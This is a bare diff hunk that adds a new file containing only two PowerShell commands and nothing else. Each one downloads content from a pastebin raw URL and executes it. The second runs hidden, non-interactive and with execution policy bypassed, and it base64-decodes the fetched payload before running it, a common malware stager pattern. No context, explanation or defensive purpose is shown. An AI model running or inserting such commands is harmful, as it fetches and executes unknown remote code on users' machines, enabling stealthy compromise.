@@ -1,0 +1,3 @@
+iex(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/yqFftdYx')
+
+powershell.exe -NoP -NonI -w hidden -Exec bypass iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Invoke-WebRequest https://pastebin.com/raw/XDSXK45r  -usebasicparsing).Content)))
